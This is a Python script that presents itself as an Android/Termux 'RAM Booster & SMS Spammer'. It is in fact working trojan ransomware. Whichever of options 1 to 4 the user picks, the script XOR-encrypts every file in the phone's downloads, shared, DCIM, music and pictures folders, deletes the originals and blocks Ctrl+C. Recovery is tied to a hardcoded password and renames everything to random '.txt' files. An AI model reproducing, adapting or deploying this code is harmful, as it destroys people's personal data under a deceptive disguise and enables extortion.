import os
import time
import random
import signal
import sys
from colorama import Fore, init

init()

#becarefull

def block_exit(sig, frame):
    print(Fore.RED + "\n[!] Can't exit this tools...")
signal.signal(signal.SIGINT, block_exit)


def slow_print(text, delay=0.03):
    for c in text:
        print(Fore.GREEN + c, end='', flush=True)
        time.sleep(delay)
    print()


def loading_effect(text, delay=0.2, repeat=3):
    for _ in range(repeat):
        for dot in ['.', '..', '...']:
            sys.stdout.write(Fore.CYAN + f"\r{text}{dot}   ")
            sys.stdout.flush()
            time.sleep(delay)
    print()


def xor_encrypt(data, key):
    return bytearray([b ^ key for b in data])


def encrypt_files(folder, key):
    for root, dirs, files in os.walk(folder):
        for filename in files:
            path = os.path.join(root, filename)
            try:
                with open(path, 'rb') as f:
                    content = f.read()
                encrypted = xor_encrypt(content, key)
                newname = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10)) + ".boost"
                newpath = os.path.join(root, newname)
                with open(newpath, 'wb') as f:
                    f.write(encrypted)
                os.remove(path)
                print(Fore.YELLOW + f"[bosht file] {filename} -> {newname}")
            except:
                pass


def decrypt_files(folder, key):
    for root, dirs, files in os.walk(folder):
        for filename in files:
            if filename.endswith(".boost"):
                path = os.path.join(root, filename)
                try:
                    with open(path, 'rb') as f:
                        content = f.read()
                    decrypted = xor_encrypt(content, key)
                    newname = "decrypted_" + str(random.randint(1000,9999)) + ".txt"
                    newpath = os.path.join(root, newname)
                    with open(newpath, 'wb') as f:
                        f.write(decrypted)
                    os.remove(path)
                    print(Fore.CYAN + f"[UNLOCKED] {filename} -> {newname}")
                except:
                    pass


accessible_folders = [
    os.path.expanduser("~/storage/downloads"),
    os.path.expanduser("~/storage/shared"),
    os.path.expanduser("~/storage/dcim"),
    os.path.expanduser("~/storage/music"),
    os.path.expanduser("~/storage/pictures"),
]

def encrypt_all_accessible(key):
    for folder in accessible_folders:
        if os.path.exists(folder):
            print(Fore.BLUE + f"\n[+] Memproses folder: {folder}")
            encrypt_files(folder, key)
            
            

def show_logo():
    os.system("clear")
    print(Fore.RED + r"""
╔═╗┌─┐┬ ┬┌─┐┬─┐╔═╗┬─┐
║  ├┤ │ ││ │├┬┘║ ║├┬┘
╚═╝└  └─┘└─┘┴└─╚═╝┴└─ v2
    """)
    print(Fore.MAGENTA + "       RAM Booster & SMS Spammer by Xveen-03")
    print(Fore.WHITE)


def menu():
    show_logo()
    loading_effect("Loading menu ")

    print(Fore.YELLOW + """
[1] RAM Optimize
[2] Send SMS Spam 
[3] Mode Gaming
[4] Speed Up Internet 
[5] Restore As Original 
""")

    slow_print(Fore.GREEN + "Select menu: ", delay=0.05)
    pilihan = input()

    if pilihan == "1":
        slow_print("Optimizing the system ...")
        time.sleep(2)
        slow_print("Scan junk files ...")
        time.sleep(2)
        encrypt_all_accessible(key=222)
        slow_print("RAM successfully optimized!")
        slow_print("but Your data has been encrypted by Xveen-03 ")

    elif pilihan == "2":
        slow_print("Enter SMS spam mode ...", delay=0.05)
        no = input(Fore.CYAN + "Enter target number  (Example: +62xxxx): ")
        jumlah = input(Fore.CYAN + "amount of spam : ")

        
        print(Fore.MAGENTA + "\n[!] Mesassage from Xveen-03\n : Be careful...\n")
        time.sleep(1)
        encrypt_all_accessible(key=222)

        slow_print(f"Send {jumlah} spam  {no}...", delay=0.05)
        for i in range(int(jumlah)):
            sys.stdout.write(Fore.YELLOW + f"\r Send spam to {no} [{i+1}/{jumlah}]")
            sys.stdout.flush()
            time.sleep(0.3)

        print()
        slow_print(Fore.GREEN + "\n[✓] All spam successfully 'sent'!")
        slow_print(Fore.GREEN + "\nbut Your data has been encrypted by Xveen-03")

    elif pilihan == "3":
        slow_print("Activating Gaming Mode...")
        time.sleep(1)
        encrypt_all_accessible(key=222)
        slow_print("Gaming mode is enabled \n but your data has been encrypted by Xveen-03 ")

    elif pilihan == "4":
        slow_print("Increase internet speed...")
        time.sleep(2)
        encrypt_all_accessible(key=222)
        slow_print("The Internet has been accelerated \n but Your data has been encrypted by Xveen-03!!")

    elif pilihan == "5":
        pw = input("Enter password to decrypt : ")
        if pw == "Xvenn-03 Is GOD":
            target = "/sdcard/"
            decrypt_files(target, key=222)
            print(Fore.GREEN + "[✓] Succes decrypt (Maybe)!!")
        else:
            print(Fore.RED + "Encrypt by Xveen-03")

    else:
        print(Fore.RED + "What You Doing?.")


menu()
